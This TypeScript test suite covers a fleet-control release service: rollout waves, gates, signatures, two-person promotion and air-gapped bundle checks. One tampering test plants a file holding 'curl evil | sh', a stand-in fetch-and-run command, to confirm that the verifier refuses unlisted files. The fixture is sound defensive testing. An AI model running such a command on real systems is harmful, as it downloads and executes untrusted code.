// fleet-control (spec 11): the rules of waves, gates and signatures on their own, then a
// real fleet-control process on a fresh directory database taking a release from dev to
// stable with two-person promotion, gate failures, an expedited fix, a halt, a second
// replica and a restart, and a sovereign fleet-control (with its own database, as in the
// sovereign cell) countersigning an air-gapped bundle that the on-premises check then
// accepts or refuses.

import assert from 'node:assert/strict';
import { createHash, generateKeyPairSync, type KeyObject } from 'node:crypto';
import { mkdir, mkdtemp, rm, symlink, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { after, before, describe, test } from 'node:test';
import type pg from 'pg';
import { loadConfig, type Config } from '../../src/config/index.config.ts';
import { countersignBundle, signBundle } from '../../src/contracts/fleet-control/bundle.contract.ts';
import { readRelease, registerRelease, type ReleaseManifest } from '../../src/contracts/fleet-control/release.contract.ts';
import { putReleaseSbom } from '../../src/contracts/fleet-control/sbom.contract.ts';
import { listFleetEvents } from '../../src/contracts/fleet-control/events.contract.ts';
import {
  approvePromotion, desiredRelease, GATES, haltRollout, readChannel, readRollout, reportVerdict, requestPromotion, type RolloutView,
} from '../../src/contracts/fleet-control/rollout.contract.ts';
import { createLogger } from '../../src/infra/logger.infra.ts';
import { createServiceClient, type ServiceClient } from '../../src/infra/serviceClient.infra.ts';
import { runProcess, type RunningProcess } from '../../src/process.ts';
import { createFleetService } from '../../src/routes/fleet-control/index.route.ts';
import { directoryArtefactStore } from '../../src/services/fleet-control/artefactStore.service.ts';
import { putReleaseDocument } from '../../src/scripts/putReleaseDocument.script.ts';
import { ARTEFACTS_DIR, BUNDLE_FILE, describeBundleFiles, SIGNATURES_FILE, verifyBundle } from '../../src/services/fleet-control/bundle.service.ts';
import { keyFileSigner, signDocument, trustedKey, verifyDocument } from '../../src/services/fleet-control/signing.service.ts';
import { advanceRollout, dedicatedCells, desiredFor, planWaves, verdictOf } from '../../src/services/fleet-control/waves.service.ts';
import { createHarness, uuidv7, type Harness } from '../db/harness.helper.ts';

const HOUR = 3_600_000;
const PASS = GATES.map((gate) => ({ gate, passed: true }));
const sha = (text: string): string => `sha256:${createHash('sha256').update(text).digest('hex')}`;
const pem = (key: KeyObject): string => key.export({ type: 'pkcs8', format: 'pem' }).toString();
const quiet = createLogger({ service: 'fleet-control', cell: 'global-uk', release: 'test', level: 'error', write: () => undefined });

let clock = Date.parse('2026-11-02T09:00:00Z');

/** An empty SBOM of one artefact of a release: what promotion past canary needs received (spec 11.1). */
const sbomDoc = (releaseId: string, subject: string): string => (subject.startsWith('image:')
  ? JSON.stringify({ spdxVersion: 'SPDX-2.3', name: `${releaseId}/${subject}`, packages: [] })
  : JSON.stringify({ bomFormat: 'CycloneDX', specVersion: '1.5', metadata: { component: { name: `${releaseId}/${subject}` } }, components: [] }));

function manifest(releaseId: string, extra: Partial<ReleaseManifest> = {}): ReleaseManifest {
  return {
    schema: 'silo.release.v1', releaseId, target: 'commercial', cellTemplateVersion: '1.0.0',
    images: (['auth', 'policy'] as const).map((service) => ({ service, digest: sha(`${releaseId}/${service}`), sbom: { format: 'spdx', digest: sha(sbomDoc(releaseId, `image:${service}`)) } })),
    migrations: [{ database: 'cell', version: '0001', name: 'Initial', digest: sha('0001') }],
    configurationDigest: sha('config'), flagsDigest: sha('flags'), modelRoutingDigest: sha('routes'),
    agentBinaries: [{ platform: 'linux_x86_64', version: '1.0.0', digest: sha(`${releaseId}/agent`), sbom: { format: 'cyclonedx', digest: sha(sbomDoc(releaseId, 'agent:linux_x86_64')) } }],
    capabilities: ['gcs', 'cloud_kms'], securityFix: false,
    provenance: { sourceCommit: 'a'.repeat(40), builder: 'ci' }, builtAt: new Date(clock).toISOString(),
    ...extra,
  };
}

describe('waves, gates and signatures (spec 11.1, 11.2)', () => {
  const cells = [
    ['test-1', 'commercial', 'uk', 'active'], ['uk-lon-canary', 'commercial', 'uk', 'active'], ['us-va-1', 'commercial', 'us', 'active'],
    ['eu-fra-1', 'commercial', 'eu', 'closed_to_placement'], ['uk-lon-1', 'commercial', 'uk', 'active'], ['ded-acme', 'dedicated', 'uk', 'active'],
    ['uk-sov-1', 'sovereign', 'uk', 'active'], ['uk-lon-2', 'commercial', 'uk', 'provisioning'], ['onprem-1', 'self_managed', 'uk', 'active'],
  ].map(([id, kind, residency, status]) => ({ id, kind, residency, status }) as Parameters<typeof planWaves>[1][number]);
  const plan = { testCells: ['test-1'], canaryCells: ['uk-lon-canary'] };

  test('stable goes test cells, canary, US, EU, UK, then each dedicated cell on its own; never a provisioning, sovereign or self-managed cell', () => {
    assert.deepEqual(planWaves('stable', cells, plan), [
      { cells: ['test-1'], soakHours: 4 }, { cells: ['uk-lon-canary'], soakHours: 48 }, { cells: ['us-va-1'], soakHours: 24 },
      { cells: ['eu-fra-1'], soakHours: 24 }, { cells: ['uk-lon-1'], soakHours: 24 },
    ]);
    assert.deepEqual(dedicatedCells(cells), ['ded-acme'], 'wave 5: each in its own rollout, in its customer\'s window');
    assert.deepEqual(planWaves('dev', cells, plan), [{ cells: ['test-1'], soakHours: 0 }]);
    assert.deepEqual(planWaves('canary', cells, plan).map((w) => w.cells), [['test-1'], ['uk-lon-canary']]);
    assert.deepEqual(planWaves('sovereign', cells, plan), [{ cells: ['uk-sov-1'], soakHours: 24 }]);
    assert.deepEqual(planWaves('agent-stable', cells, plan), []);
  });

  test('a verdict passes only with every gate present and passing: a missing signal is a failure', () => {
    assert.deepEqual(verdictOf(PASS), { verdict: 'pass', failedGates: [] });
    assert.deepEqual(verdictOf(PASS.slice(1)), { verdict: 'fail', failedGates: ['error_rate'] });
    assert.equal(verdictOf([...PASS, { gate: 'latency', passed: false }]).verdict, 'fail');
  });

  const rollout = (waves: { cells: string[]; soakHours: number }[]): RolloutView => ({
    rolloutId: uuidv7(), cellId: null, notice: null, channel: 'stable', releaseId: 'r2', previousReleaseId: 'r1', sequence: 2, status: 'running',
    startedAt: new Date(0).toISOString(), endedAt: null, haltReason: null, haltedBy: null,
    waves: waves.map((w) => ({ ...w, startedAt: null, passedAt: null })), verdicts: {},
  });
  const verdict = (r: RolloutView, cell: string, at: number, v: 'pass' | 'fail' = 'pass', releaseId = 'r2') => {
    r.verdicts[cell] = { releaseId, verdict: v, failedGates: [], reportedAt: new Date(at).toISOString() };
  };

  test('a wave passes after its soak with every cell passing; the next starts; the last completes the rollout', () => {
    let r = advanceRollout(rollout([{ cells: ['a'], soakHours: 4 }, { cells: ['b', 'c'], soakHours: 24 }]), 0, 30).rollout;
    assert.equal(r.waves[0]!.startedAt, new Date(0).toISOString());
    assert.deepEqual(desiredFor(r, 'a'), { releaseId: 'r2', reason: 'wave_started' });
    assert.deepEqual(desiredFor(r, 'b'), { releaseId: 'r1', reason: 'wave_pending' });
    verdict(r, 'a', HOUR);
    r = advanceRollout(r, 3 * HOUR, 30).rollout;
    assert.equal(r.waves[0]!.passedAt, null, 'not before the soak ends');
    r = advanceRollout(r, 4 * HOUR, 30).rollout;
    assert.ok(r.waves[0]!.passedAt !== null && r.waves[1]!.startedAt !== null);
    verdict(r, 'b', 5 * HOUR);
    verdict(r, 'c', 3 * HOUR);
    r = advanceRollout(r, 28 * HOUR, 30).rollout;
    assert.equal(r.status, 'running', 'a verdict from before the wave started does not count');
    verdict(r, 'c', 6 * HOUR);
    r = advanceRollout(r, 28 * HOUR, 30).rollout;
    assert.equal(r.status, 'completed');
    assert.deepEqual(desiredFor(r, 'zzz'), { releaseId: 'r2', reason: 'current' });
  });

  test('a failing verdict halts at once; a silent cell halts after the grace; both roll back', () => {
    let r = advanceRollout(rollout([{ cells: ['a', 'b'], soakHours: 4 }]), 0, 30).rollout;
    verdict(r, 'a', HOUR, 'fail');
    r = advanceRollout(r, HOUR, 30).rollout;
    assert.deepEqual([r.status, r.haltReason], ['halted', 'gate_failed']);
    assert.deepEqual(desiredFor(r, 'a'), { releaseId: 'r1', reason: 'rolled_back' });

    let s = advanceRollout(rollout([{ cells: ['a', 'b'], soakHours: 4 }]), 0, 30).rollout;
    verdict(s, 'a', HOUR);
    s = advanceRollout(s, 4 * HOUR + 29 * 60_000, 30).rollout;
    assert.equal(s.status, 'running');
    s = advanceRollout(s, 4 * HOUR + 30 * 60_000, 30).rollout;
    assert.deepEqual([s.status, s.haltReason], ['halted', 'signal_missing']);
  });

  test('a signature holds only for its document, its kind and a trusted key of the role required', async () => {
    const pair = generateKeyPairSync('ed25519');
    const other = generateKeyPairSync('ed25519');
    const signer = keyFileSigner(pair.privateKey, 'release', pair.publicKey);
    const trusted = [trustedKey(pair.publicKey, 'release')];
    const document = manifest('r1');
    const signature = await signDocument(signer, 'release', document);
    verifyDocument('release', document, [signature], trusted, ['release']);
    assert.throws(() => verifyDocument('release', { ...document, securityFix: true }, [signature], trusted, ['release']), { code: 'fleet.signature_invalid' });
    assert.throws(() => verifyDocument('channel', document, [signature], trusted, ['release']), { code: 'fleet.signature_invalid' });
    assert.throws(() => verifyDocument('release', document, [signature], [trustedKey(other.publicKey, 'release')], ['release']),
      { code: 'fleet.signature_missing' });
    assert.throws(() => verifyDocument('release', document, [signature], trusted, ['release', 'sovereign']), { code: 'fleet.signature_missing' });
  });
});

let h: Harness;
let sovereignDb: Harness;
let root: string;
let config: Config;
let fleet: RunningProcess;
let sovereignFleet: RunningProcess;
let portal: ServiceClient;
let agent: ServiceClient;
let sovereignPortal: ServiceClient;
const releaseKeys = generateKeyPairSync('ed25519');
const sovereignKeys = generateKeyPairSync('ed25519');
const engineers = { a: uuidv7(), b: uuidv7(), c: uuidv7(), d: uuidv7() };

const baseEnv = (extra: Record<string, string>): Record<string, string> => ({
  SILO_ENV: 'test', SILO_SERVICE: 'fleet-control', SILO_CELL_ID: 'global-uk', SILO_CELL_KIND: 'commercial', SILO_RESIDENCY: 'uk',
  SILO_HOSTING: 'gke', SILO_BUILD_TARGET: 'commercial', HTTP_HOST: '127.0.0.1', HTTP_PORT: '0', HTTP_DRAIN_SECONDS: '0',
  PG_DIRECTORY_URL: h.url('test_fleet', 'directory'), FLEET_TEST_CELLS: 'test-1', FLEET_CANARY_CELLS: 'uk-lon-canary', ...extra,
});

async function startShared(): Promise<void> {
  fleet = await runProcess([createFleetService({ now: () => clock, tickMs: 50 })], config, { logger: quiet });
  const http = { ...config.http, serviceUrls: { 'fleet-control': `http://127.0.0.1:${fleet.port}` } };
  portal = createServiceClient({ caller: 'admin-portal', http });
  agent = createServiceClient({ caller: 'fleet-control', http });
}

async function waitForRollout(rolloutId: string, check: (r: RolloutView) => boolean): Promise<RolloutView> {
  const deadline = Date.now() + 5_000;
  for (;;) {
    const r = await portal.call(readRollout, { params: { rolloutId } });
    if (check(r)) return r;
    if (Date.now() > deadline) assert.fail(`rollout did not get there: ${JSON.stringify(r)}`);
    await new Promise((resolve) => setTimeout(resolve, 25));
  }
}

const promote = async (releaseId: string, channel: string, options: { by?: string; approver?: string; expedite?: boolean } = {}) => {
  if (['stable', 'sovereign', 'agent-stable', 'agent-sovereign'].includes(channel)) {
    // Past canary, a release's SBOMs are checked first: hand over the ones its manifest names.
    const { manifest: named } = await portal.call(readRelease, { params: { releaseId } });
    const subjects = [...named.images.map((i) => ({ subject: `image:${i.service}`, digest: i.sbom.digest })),
      ...named.agentBinaries.map((a) => ({ subject: `agent:${a.platform}`, digest: a.sbom.digest }))];
    for (const { subject, digest } of subjects) {
      const document = sbomDoc(releaseId, subject);
      if (sha(document) !== digest) continue;
      await portal.call(putReleaseSbom, { params: { releaseId, sha256: digest.slice('sha256:'.length) }, body: { document, operatorId: engineers.a } });
    }
  }
  const promotionId = uuidv7();
  const requested = await portal.call(requestPromotion, {
    params: { promotionId }, body: { releaseId, channel: channel as never, requestedBy: options.by ?? engineers.a, expedite: options.expedite ?? false },
  });
  if (requested.state === 'applied') return requested;
  return portal.call(approvePromotion, { params: { promotionId }, body: { approvedBy: options.approver ?? engineers.b } });
};
const desired = (cellId: string, channel: 'dev' | 'canary' | 'stable' | 'sovereign') =>
  agent.call(desiredRelease, { params: { cellId }, query: { channel } });
const verdict = (rolloutId: string, cellId: string, releaseId: string, gates = PASS) =>
  agent.call(reportVerdict, { params: { rolloutId, cellId }, body: { releaseId, gates } });

before(async () => {
  h = await createHarness();
  const writer: pg.Client = await h.connect('test_dir_writer', 'directory');
  for (const [id, kind, residency] of [['test-1', 'commercial', 'uk'], ['uk-lon-canary', 'commercial', 'uk'], ['us-va-1', 'commercial', 'us'],
    ['eu-fra-1', 'commercial', 'eu'], ['uk-lon-1', 'commercial', 'uk'], ['ded-acme', 'dedicated', 'uk'], ['uk-sov-1', 'sovereign', 'uk']]) {
    await writer.query(`insert into directory.cells (id, kind, residency, hostname, status) values ($1, $2, $3, $4, 'active')`,
      [id, kind, residency, `${id}.silohq.io`]);
  }
  root = await mkdtemp(path.join(tmpdir(), 'silo-fleet-'));
  const releasePublic = path.join(root, 'release.pub.pem');
  await writeFile(releasePublic, releaseKeys.publicKey.export({ type: 'spki', format: 'pem' }).toString());
  config = loadConfig(baseEnv({ FLEET_ARTEFACT_DIR: path.join(root, 'shared'), FLEET_SIGNING_KEY: pem(releaseKeys.privateKey) }));
  // The documents every release here names, which a cell channel requires (spec 11.1).
  for (const store of ['shared', 'sovereign']) {
    for (const text of ['config', 'flags', 'routes']) await putReleaseDocument(directoryArtefactStore(path.join(root, store)), Buffer.from(text));
  }
  await startShared();
  sovereignDb = await createHarness();
  const sovereignConfig = loadConfig(baseEnv({
    PG_DIRECTORY_URL: sovereignDb.url('test_fleet', 'directory'),
    SILO_CELL_ID: 'uk-sov-1', SILO_CELL_KIND: 'sovereign', SILO_BUILD_TARGET: 'sovereign', SILO_APPROVED_CAPABILITIES: '',
    FLEET_ARTEFACT_DIR: path.join(root, 'sovereign'), FLEET_SIGNING_KEY: pem(sovereignKeys.privateKey), FLEET_SIGNING_ROLE: 'sovereign',
    FLEET_RELEASE_PUBLIC_KEY_FILE: releasePublic,
  }));
  sovereignFleet = await runProcess([createFleetService({ now: () => clock, tickMs: 50 })], sovereignConfig, { logger: quiet });
  sovereignPortal = createServiceClient({
    caller: 'admin-portal', http: { ...sovereignConfig.http, serviceUrls: { 'fleet-control': `http://127.0.0.1:${sovereignFleet.port}` } },
  });
});

after(async () => {
  for (const client of [portal, agent, sovereignPortal]) client?.close();
  await fleet?.stop('test');
  await sovereignFleet?.stop('test');
  await h?.close();
  await sovereignDb?.close();
  await rm(root, { recursive: true, force: true });
});

describe('the release registry (spec 11.1)', () => {
  test('a release is validated, signed and immutable', async () => {
    const registered = await portal.call(registerRelease, { params: { releaseId: 'r1' }, body: { manifest: manifest('r1'), operatorId: engineers.a } });
    verifyDocument('release', registered.manifest, registered.signatures, [trustedKey(releaseKeys.publicKey, 'release')], ['release']);
    const again = await portal.call(registerRelease, { params: { releaseId: 'r1' }, body: { manifest: manifest('r1'), operatorId: engineers.b } });
    assert.equal(again.registeredAt, registered.registeredAt);
    await assert.rejects(portal.call(registerRelease, {
      params: { releaseId: 'r1' }, body: { manifest: manifest('r1', { securityFix: true }), operatorId: engineers.a },
    }), { code: 'fleet.release_exists' });
    assert.equal((await agent.call(readRelease, { params: { releaseId: 'r1' } })).manifestDigest, registered.manifestDigest);
  });

  test('refused: a sovereign build carrying a compiled-out service or capability, a mismatched id', async () => {
    const sovereign = (extra: Partial<ReleaseManifest>) => portal.call(registerRelease, {
      params: { releaseId: 's-bad' }, body: { manifest: manifest('s-bad', { target: 'sovereign', commercialRelease: 'r1', capabilities: [], ...extra }), operatorId: engineers.a },
    });
    await assert.rejects(sovereign({ images: [{ service: 'discovery', digest: sha('d'), sbom: { format: 'spdx', digest: sha('ds') } }] }),
      { code: 'fleet.manifest_invalid' });
    await assert.rejects(sovereign({ capabilities: ['stripe'] }), { code: 'fleet.manifest_invalid' });
    await assert.rejects(sovereign({ commercialRelease: undefined }), { code: 'fleet.manifest_invalid' });
    await assert.rejects(portal.call(registerRelease, { params: { releaseId: 'other' }, body: { manifest: manifest('r9'), operatorId: engineers.a } }),
      { code: 'fleet.manifest_invalid' });
  });
});

describe('channels and rollouts (spec 11.2)', () => {
  let canaryRollout: string;
  let stableRollout: string;

  test('dev takes a release from one engineer and rolls it to the test cells', async () => {
    const applied = await promote('r1', 'dev');
    assert.deepEqual([applied.state, applied.approvedBy, applied.sequence], ['applied', null, 1]);
    const answer = await desired('test-1', 'dev');
    assert.deepEqual([answer.releaseId, answer.reason], ['r1', 'wave_started']);
    verifyDocument('release', answer.release!.manifest, answer.release!.signatures, [trustedKey(releaseKeys.publicKey, 'release')], ['release']);
    await verdict(applied.rolloutId!, 'test-1', 'r1');
    await waitForRollout(applied.rolloutId!, (r) => r.status === 'completed');
    assert.equal((await desired('test-1', 'dev')).reason, 'current');
  });

  test('canary needs a second engineer; it waits on dev and on its own soak', async () => {
    await assert.rejects(promote('r1', 'stable'), { code: 'fleet.canary_soak' });
    const promotionId = uuidv7();
    await portal.call(requestPromotion, { params: { promotionId }, body: { releaseId: 'r1', channel: 'canary', requestedBy: engineers.a } });
    await assert.rejects(portal.call(approvePromotion, { params: { promotionId }, body: { approvedBy: engineers.a } }), { code: 'fleet.two_person' });
    const applied = await portal.call(approvePromotion, { params: { promotionId }, body: { approvedBy: engineers.b } });
    canaryRollout = applied.rolloutId!;
    assert.deepEqual([(await desired('uk-lon-canary', 'canary')).reason, (await desired('uk-lon-canary', 'canary')).releaseId], ['wave_pending', null]);

    await verdict(canaryRollout, 'test-1', 'r1');
    await assert.rejects(verdict(canaryRollout, 'uk-lon-canary', 'r1'), { code: 'fleet.cell_not_in_wave' });
    clock += 4 * HOUR;
    await waitForRollout(canaryRollout, (r) => r.waves[1]!.startedAt !== null);
    assert.equal((await desired('uk-lon-canary', 'canary')).reason, 'wave_started');
    await verdict(canaryRollout, 'uk-lon-canary', 'r1');
    clock += 47 * HOUR;
    await assert.rejects(promote('r1', 'stable'), { code: 'fleet.canary_soak' });
    clock += 1 * HOUR;
    await waitForRollout(canaryRollout, (r) => r.status === 'completed');
  });

  test('stable follows the waves; a failing gate halts it and the cells roll back', async () => {
    const applied = await promote('r1', 'stable');
    stableRollout = applied.rolloutId!;
    const rollout = await portal.call(readRollout, { params: { rolloutId: stableRollout } });
    assert.deepEqual(rollout.waves.map((w) => w.cells), [['test-1'], ['uk-lon-canary'], ['us-va-1'], ['eu-fra-1'], ['uk-lon-1']]);
    assert.equal((await desired('us-va-1', 'stable')).reason, 'wave_pending');
    await assert.rejects(verdict(stableRollout, 'test-1', 'r0'), { code: 'fleet.verdict_release_mismatch' });
    const halted = await verdict(stableRollout, 'test-1', 'r1', PASS.filter((g) => g.gate !== 'synthetic_revert'));
    assert.deepEqual([halted.status, halted.haltReason, halted.verdicts['test-1']!.failedGates], ['halted', 'gate_failed', ['synthetic_revert']]);
    assert.deepEqual([(await desired('test-1', 'stable')).reason, (await desired('test-1', 'stable')).releaseId], ['rolled_back', null]);
  });

  test('a security fix may skip the canary soak when expedited; one rollout per channel otherwise', async () => {
    await portal.call(registerRelease, { params: { releaseId: 'r2' }, body: { manifest: manifest('r2', { securityFix: true }), operatorId: engineers.a } });
    await portal.call(registerRelease, { params: { releaseId: 'r3' }, body: { manifest: manifest('r3'), operatorId: engineers.a } });
    await assert.rejects(promote('r2', 'canary'), { code: 'fleet.not_passed_dev' });
    const dev = await promote('r2', 'dev');
    await verdict(dev.rolloutId!, 'test-1', 'r2');
    await waitForRollout(dev.rolloutId!, (r) => r.status === 'completed');
    await promote('r2', 'canary');
    const dev3 = await promote('r3', 'dev');
    await verdict(dev3.rolloutId!, 'test-1', 'r3');
    await waitForRollout(dev3.rolloutId!, (r) => r.status === 'completed');
    await assert.rejects(promote('r3', 'canary'), { code: 'fleet.rollout_in_progress' }, 'canary is still rolling r2 out');

    await assert.rejects(promote('r3', 'stable', { expedite: true }), { code: 'fleet.expedite_not_security_fix' });
    const expedited = await promote('r2', 'stable', { expedite: true, approver: engineers.c });
    assert.deepEqual([expedited.expedite, expedited.approvedBy, expedited.sequence], [true, engineers.c, 2]);
    const rollout = await portal.call(readRollout, { params: { rolloutId: expedited.rolloutId! } });
    assert.equal(rollout.previousReleaseId, null, 'the halted r1 never became the last good release');
    stableRollout = expedited.rolloutId!;

    const channel = await agent.call(readChannel, { params: { channel: 'stable' } });
    assert.deepEqual([channel.head!.document.sequence, channel.head!.document.releaseId], [2, 'r2']);
    verifyDocument('channel', channel.head!.document, channel.head!.signatures, [trustedKey(releaseKeys.publicKey, 'release')], ['release']);
  });

  test('a halt by hand rolls back and holds; a halted rollout halts again unchanged', async () => {
    const halted = await portal.call(haltRollout, { params: { rolloutId: stableRollout }, body: { haltedBy: engineers.d } });
    assert.deepEqual([halted.status, halted.haltReason, halted.haltedBy], ['halted', 'manual', engineers.d]);
    assert.equal((await portal.call(haltRollout, { params: { rolloutId: stableRollout }, body: { haltedBy: engineers.a } })).haltedBy, engineers.d);
    assert.equal((await desired('test-1', 'stable')).reason, 'rolled_back');
    await assert.rejects(portal.call(haltRollout, { params: { rolloutId: canaryRollout }, body: { haltedBy: engineers.d } }),
      { code: 'fleet.rollout_not_running' });
  });

  test('a sovereign build waits 14 days of stable for its commercial release; channels take only their target', async () => {
    await portal.call(registerRelease, {
      params: { releaseId: 's1' }, body: { manifest: manifest('s1', { target: 'sovereign', commercialRelease: 'r2', capabilities: [] }), operatorId: engineers.a },
    });
    await assert.rejects(promote('s1', 'stable'), { code: 'fleet.wrong_target' });
    await assert.rejects(promote('s1', 'sovereign'), { code: 'fleet.stable_soak' });
    await assert.rejects(promote('s1', 'agent-sovereign'), { code: 'fleet.not_on_sovereign' });
  });

  test('a second replica on the same tables agrees: one sequence, one running rollout per channel', async () => {
    const second = await runProcess([createFleetService({ now: () => clock, tickMs: 50 })], config, { logger: quiet });
    const http = { ...config.http, serviceUrls: { 'fleet-control': `http://127.0.0.1:${second.port}` } };
    const portal2 = createServiceClient({ caller: 'admin-portal', http });
    try {
      assert.deepEqual(await portal2.call(readRollout, { params: { rolloutId: stableRollout } }),
        await portal.call(readRollout, { params: { rolloutId: stableRollout } }));
      await portal.call(registerRelease, { params: { releaseId: 'r4' }, body: { manifest: manifest('r4'), operatorId: engineers.a } });
      await portal.call(registerRelease, { params: { releaseId: 'r5' }, body: { manifest: manifest('r5'), operatorId: engineers.a } });
      // Both replicas promote into dev at once: each gets its own sequence, and the second
      // promotion supersedes nothing (dev's rollouts finish at once with no soak) or waits its turn.
      const results = await Promise.allSettled([
        portal.call(requestPromotion, { params: { promotionId: uuidv7() }, body: { releaseId: 'r4', channel: 'dev', requestedBy: engineers.a } }),
        portal2.call(requestPromotion, { params: { promotionId: uuidv7() }, body: { releaseId: 'r5', channel: 'dev', requestedBy: engineers.a } }),
      ]);
      const applied = results.filter((r) => r.status === 'fulfilled').map((r) => (r as PromiseFulfilledResult<{ sequence: number | null }>).value);
      const refused = results.filter((r) => r.status === 'rejected').map((r) => (r as PromiseRejectedResult).reason as { code?: string });
      assert.ok(applied.length >= 1);
      for (const reason of refused) assert.equal(reason.code, 'fleet.rollout_in_progress');
      const sequences = applied.map((p) => p.sequence);
      assert.equal(new Set(sequences).size, sequences.length, 'no two heads share a sequence');
      const head = await agent.call(readChannel, { params: { channel: 'dev' } });
      assert.equal(head.head!.document.sequence, Math.max(...sequences.map(Number)));
    } finally {
      portal2.close();
      await second.stop('test');
    }
  });

  test('a cell asks and reports only for itself', async () => {
    const http = { ...config.http, serviceUrls: { 'fleet-control': `http://127.0.0.1:${fleet.port}` } };
    const london = createServiceClient({ caller: 'fleet-control', cell: 'uk-lon-1', http });
    try {
      await assert.rejects(london.call(desiredRelease, { params: { cellId: 'test-1' }, query: { channel: 'stable' } }),
        { category: 'forbidden', code: 'fleet.foreign_cell' });
      assert.equal((await london.call(desiredRelease, { params: { cellId: 'uk-lon-1' }, query: { channel: 'stable' } })).channel, 'stable');
      await assert.rejects(london.call(reportVerdict, { params: { rolloutId: stableRollout, cellId: 'test-1' }, body: { releaseId: 'r2', gates: PASS } }),
        { code: 'fleet.foreign_cell' });
    } finally {
      london.close();
    }
  });

  test('a restarted fleet-control keeps its channels, rollouts and promotions', async () => {
    const before = await portal.call(readRollout, { params: { rolloutId: stableRollout } });
    portal.close();
    agent.close();
    await fleet.stop('test');
    await startShared();
    assert.deepEqual(await portal.call(readRollout, { params: { rolloutId: stableRollout } }), before);
    assert.equal((await agent.call(readChannel, { params: { channel: 'stable' } })).head!.document.sequence, 2);
    assert.equal((await desired('test-1', 'stable')).reason, 'rolled_back');
  });

  test('only a cell Fleet agent asks which release to run', async () => {
    const response = await fetch(`http://127.0.0.1:${fleet.port}/v1/cells/test-1/release?channel=stable`, { headers: { 'x-silo-caller': 'gateway' } });
    assert.equal(response.status, 403);
  });
});

describe('air-gapped bundles (spec 11.4)', () => {
  let media: string;
  let signed: { bundle: unknown; signatures: unknown[] };
  const trust = [trustedKey(releaseKeys.publicKey, 'release'), trustedKey(sovereignKeys.publicKey, 'sovereign')];

  const writeMedia = async (bundle: unknown, signatures: unknown[]): Promise<void> => {
    await writeFile(path.join(media, BUNDLE_FILE), JSON.stringify(bundle));
    await writeFile(path.join(media, SIGNATURES_FILE), JSON.stringify(signatures));
  };

  before(async () => {
    media = path.join(root, 'media');
    const artefacts = path.join(media, ARTEFACTS_DIR);
    await mkdir(path.join(artefacts, 'images'), { recursive: true });
    await writeFile(path.join(artefacts, 'images', 'auth.tar'), 'auth image bytes');
    await writeFile(path.join(artefacts, 'images', 'policy.tar'), 'policy image bytes');
    await writeFile(path.join(artefacts, 'sbom.spdx.json'), '{"spdxVersion":"SPDX-2.3"}');
  });

  test('fleet-control signs the manifest of hashes; the sovereign fleet-control countersigns it after checking the release signature', async () => {
    const files = await describeBundleFiles(path.join(media, ARTEFACTS_DIR));
    assert.deepEqual(files.map((f) => f.path), ['images/auth.tar', 'images/policy.tar', 'sbom.spdx.json']);
    const bundleId = uuidv7();
    signed = await portal.call(signBundle, { params: { bundleId }, body: { releaseId: 'r2', fromReleaseId: 'r1', files, operatorId: engineers.a } });
    assert.deepEqual(await portal.call(signBundle, { params: { bundleId }, body: { releaseId: 'r2', fromReleaseId: 'r1', files, operatorId: engineers.b } }), signed);
    await writeMedia(signed.bundle, signed.signatures);
    const verified = await verifyBundle(media, { keys: trust, requireSovereign: false });
    assert.equal(verified.files, 3);
    await assert.rejects(verifyBundle(media, { keys: trust, requireSovereign: true }), { code: 'fleet.bundle_refused' });

    const tampered = { ...(signed.bundle as object), releaseId: 'r3' };
    await assert.rejects(sovereignPortal.call(countersignBundle, {
      params: { bundleId }, body: { bundle: tampered as never, signatures: signed.signatures as never, operatorId: engineers.c },
    }), { code: 'fleet.signature_invalid' });
    const countersigned = await sovereignPortal.call(countersignBundle, {
      params: { bundleId }, body: { bundle: signed.bundle as never, signatures: signed.signatures as never, operatorId: engineers.c },
    });
    assert.deepEqual(countersigned.signatures.map((s) => s.role), ['release', 'sovereign']);
    const recorded = (await sovereignPortal.call(listFleetEvents, { query: {} })).events;
    assert.deepEqual(recorded.map((e) => [e.event, e.detail['bundle_id']]), [['sovereign_release_countersigned', bundleId]],
      'the sovereign fleet-control keeps its own event log');
    await writeMedia(countersigned.bundle, countersigned.signatures);
    await verifyBundle(media, { keys: trust, requireSovereign: true });
  });

  test('each fleet-control signs only as its own key allows', async () => {
    await assert.rejects(portal.call(countersignBundle, {
      params: { bundleId: uuidv7() }, body: { bundle: signed.bundle as never, signatures: signed.signatures as never, operatorId: engineers.c },
    }), { code: 'fleet.wrong_signing_role' });
    await assert.rejects(sovereignPortal.call(registerRelease, { params: { releaseId: 'x1' }, body: { manifest: manifest('x1'), operatorId: engineers.a } }),
      { code: 'fleet.wrong_signing_role' });
  });

  test('the whole bundle is refused on a changed byte, an extra file, a missing file or a link', async () => {
    const artefacts = path.join(media, ARTEFACTS_DIR);
    const refusal = async (reason: string) => {
      await assert.rejects(verifyBundle(media, { keys: trust, requireSovereign: true }),
        (error: { code?: string; details?: { reason?: string } }) => error.code === 'fleet.bundle_refused' && error.details?.reason === reason);
    };
    await writeFile(path.join(artefacts, 'images', 'auth.tar'), 'AUTH image bytes');
    await refusal('hash');
    await writeFile(path.join(artefacts, 'images', 'auth.tar'), 'auth image bytes');
    await writeFile(path.join(artefacts, 'extra.sh'), 'curl evil | sh');
    await refusal('unlisted_file');
    await rm(path.join(artefacts, 'extra.sh'));
    await rm(path.join(artefacts, 'sbom.spdx.json'));
    await refusal('missing_file');
    await symlink('/etc/hosts', path.join(artefacts, 'sbom.spdx.json'));
    await refusal('not_a_file');
  });
});

describe('configuration', () => {
  test('production refuses a signing key file: releases are signed in the HSM (spec 11.1)', () => {
    assert.throws(() => loadConfig(baseEnv({
      SILO_ENV: 'production', FLEET_ARTEFACT_DIR: '/tmp/x', FLEET_SIGNING_KEY: pem(releaseKeys.privateKey), SILO_RELEASE: 'r1',
    })), /FLEET_SIGNING_KEY: production signs releases in the HSM/);
    assert.throws(() => loadConfig(baseEnv({ FLEET_SIGNING_KEY: 'not a key' })), /FLEET_SIGNING_KEY: must be an Ed25519 private key/);
  });
});
